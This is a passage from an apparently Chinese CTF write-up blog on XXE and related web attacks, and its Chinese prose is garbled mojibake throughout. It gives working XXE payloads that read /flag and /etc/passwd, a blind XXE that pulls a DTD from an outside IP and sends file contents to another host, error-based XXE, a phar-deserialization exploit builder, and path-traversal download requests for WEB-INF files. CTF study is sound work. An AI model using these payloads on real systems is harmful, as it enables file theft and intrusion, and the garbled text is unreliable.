ä¼šå°†å®ä½“æ›¿æ¢ä¸ºå®ƒä»¬çš„å€¼ï¼Œè€Œ LIBXML_DTDLOAD ä¼šåŠ è½½å¤–éƒ¨ DTDã€‚</span><br>    <span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);<br>    <span class="hljs-variable">$ctfshow</span> = <span class="hljs-variable">$creds</span>-&gt;ctfshow; <span class="hljs-comment">//ä» SimpleXMLElement å¯¹è±¡ä¸­æå–åä¸º &quot;ctfshow&quot; çš„å…ƒç´ ã€‚</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$ctfshow</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><p>XML æ–‡ä»¶<br>ä¸€èˆ¬è¡¨ç¤ºå¸¦æœ‰ç»“æ„çš„æ•°æ®<br>ç¥–çˆ¶  3ä¸ªå”çˆ¶  8ä¸ªå ‚å¼Ÿå ‚å¦¹   </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">ç¥–çˆ¶</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">å”çˆ¶1</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">å ‚å…„1</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">å”çˆ¶1</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">å”çˆ¶2</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">å ‚å…„2</span>&gt;</span>    <br>    <span class="hljs-tag">&lt;/<span class="hljs-name">å”çˆ¶2</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">å”çˆ¶3</span>&gt;</span><br><br>     <span class="hljs-tag">&lt;<span class="hljs-name">å ‚å…„3</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">å”çˆ¶4</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">ç¥–çˆ¶</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE&gt;</span> å£°æ˜å®šä¹‰äº†æ•´ä¸ªæ–‡æ¡£çš„ç±»å‹ï¼Œ<span class="hljs-meta">&lt;!ENTITY&gt;</span> å£°æ˜å®šä¹‰äº†ä¸€ä¸ªå®ä½“ã€‚<br>xmlæ ¼å¼<br>1 æœ‰å›æ˜¾æ—¶æ–‡ä»¶è¯»å–æ–¹æ³•<br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hacker</span>[</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">hacker</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span> <br><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ctfshow</span>&gt;</span><br>        <span class="hljs-symbol">&amp;hacker;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">ctfshow</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br><br>php://filter/read=convert.base64-encode/resource=/flag<br></code></pre></td></tr></table></figure><p>2 æ— å›æ˜¾æ—¶æ–‡ä»¶è¯»å–æ–¹æ³•</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hacker</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">myurl</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://47.236.120.83/test.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">    %myurl;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>1<br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>test.dtdå†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ENTITY % dtd &quot;&lt;!ENTITY &amp;#x25; vps SYSTEM &#x27;http://43.154.107.226:3389/%file;&#x27;&gt; &quot;&gt;<br>%dtd;<br>%vps;<br></code></pre></td></tr></table></figure><h3 id="æŠ¥é”™xxe"><a href="#æŠ¥é”™xxe" class="headerlink" title="æŠ¥é”™xxe"></a>æŠ¥é”™xxe</h3><ul><li>libxml&lt;&#x3D;2.8(2.9ä»¥åé»˜è®¤ä¸ä½¿ç”¨å¤–éƒ¨å®ä½“)</li><li>å¼€å¯äº†æŠ¥é”™</li><li>æ— å›æ˜¾</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">message</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % a <span class="hljs-string">&#x27;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY &amp;#x25; b &quot;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">&quot;&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">&#x27;</span>&gt;</span></span><br><span class="hljs-meta">%a;</span><br><span class="hljs-meta">%b;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>asfddasfd<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æˆ–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">message</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">condition</span> <span class="hljs-string">&#x27;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &amp;#x25;eval;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &amp;#x25;error;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">&#x27;</span>&gt;</span></span><br><span class="hljs-meta">    %condition;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>any text<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="xxePhar"><a href="#xxePhar" class="headerlink" title="xxePhar"></a>xxePhar</h3><p>å¼±å£ä»¤<code>admin/admin</code>ç™»å½•ï¼Œä¼šè·³è½¬åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„ç‚¹ã€‚å¯ä»¥å…ˆä½¿ç”¨<code>XXE</code>é€ä¸€è¯»å–<code>doLogin.php</code>å’Œ<code>class.php</code>çš„æ–‡ä»¶å†…å®¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#doLogin.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">* autor: c0ny1</span><br><span class="hljs-comment">* date: 2018-2-7</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;class.php&quot;</span>);<br><span class="hljs-variable">$USERNAME</span> = <span class="hljs-string">&#x27;admin&#x27;</span>; <span class="hljs-comment">//è´¦å·</span><br><span class="hljs-variable">$PASSWORD</span> = <span class="hljs-string">&#x27;admin&#x27;</span>; <span class="hljs-comment">//å¯†ç </span><br><span class="hljs-variable">$result</span> = <span class="hljs-literal">null</span>;<br><br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><br><span class="hljs-keyword">try</span>&#123;<br><span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br><span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br><span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);<br><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$creds</span>-&gt;username;<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$creds</span>-&gt;password;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span> == <span class="hljs-variable">$USERNAME</span> &amp;&amp; <span class="hljs-variable">$password</span> == <span class="hljs-variable">$PASSWORD</span>)&#123;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-variable">$username</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$username</span>);<br>&#125;<br>&#125;<span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>)&#123;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">3</span>,<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());<br>&#125;<br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">#class.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Fun</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&#x27;call_user_func_array&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span>-&gt;func,<span class="hljs-variable">$f</span>,<span class="hljs-variable">$p</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&quot;FLAG&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;serialize me?&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/Test/&quot;</span>,<span class="hljs-title function_ invoke__">get_class</span>(<span class="hljs-variable">$this</span>-&gt;a)))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No test in Prod\n&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;a-&gt;<span class="hljs-variable">$p</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$p</span> = <span class="hljs-variable language_">$this</span>-&gt;p;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a-&gt;<span class="hljs-variable">$p</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æ„é€ åºåˆ—åŒ–å†…å®¹ï¼Œexpå¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Fun</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;func = <span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>,<span class="hljs-string">&quot;__call&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-variable">$a</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;aaa&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">B</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Fun</span>());<br><span class="hljs-variable">$a</span>-&gt;a = <span class="hljs-variable">$b</span>;<br><br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å°†ç”Ÿæˆçš„pharæ–‡ä»¶ä¸Šä¼ </p><p>æœ€ååˆ©ç”¨XXEé€šè¿‡pharåè®®è§¦å‘ååºåˆ—åŒ–è·å¾—flagã€‚ SYSTEM phar:&#x2F;&#x2F;&#x2F;temp&#x2F;phar.phat</p><h3 id="ç½‘é¼æ¯-FileJava"><a href="#ç½‘é¼æ¯-FileJava" class="headerlink" title="ç½‘é¼æ¯ FileJava"></a>ç½‘é¼æ¯ FileJava</h3><p>å¯ä»¥ä¸Šä¼ ä»»æ„æ–‡ä»¶å’Œä¸‹è½½æ–‡ä»¶ï¼Œä½†æ˜¯ä¸èƒ½è®¿é—®ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨ä¸€å¥è¯è¿æ¥ï¼Œåœ¨ä¸‹è½½æ–‡ä»¶åŠŸèƒ½å‘ç°å¯ä»¥ä¸‹è½½ä»»æ„æ–‡ä»¶ï¼Œäºæ˜¯å°†WEB-INF&#x2F;web.xmlé¡µé¢ä¸‹è½½,è®¿é—®<code>/file_in_java/DownloadServlet?filename=../../../../WEB-INF/web.xml</code>,ç›¸å…³å†…å®¹å¦‚ä¸‹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>DownloadServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>cn.abc.servlet.DownloadServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>DownloadServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/DownloadServlet<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>ListFileServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>cn.abc.servlet.ListFileServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>ListFileServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/ListFileServlet<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>UploadServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>cn.abc.servlet.UploadServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>UploadServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/UploadServlet<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure><p>å‘ç°æœ‰ä¸Šä¼ å’Œä¸‹è½½çš„é…ç½®æ–‡ä»¶ï¼Œç”±2ä¸ªç±»ç»„æˆï¼Œå°†è¿™2ä¸ªç±»è¿›è¡Œä¸‹è½½ã€‚åˆ†åˆ«è®¿é—®&#96;&#x2F;file_in_java&#x2F;DownloadServlet?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet</p><p>&#x2F;DownloadServlet.class<code>ã€</code>&#x2F;file_in_java&#x2F;DownloadServlet?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;UploadServlet.class<code>ã€‚ä½¿ç”¨</code>jd-gui.exe<code>åˆ†åˆ«è¿›è¡Œåç¼–è¯‘ï¼Œå…¶ä¸­</code>DownloadServlet.class&#96;æºç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 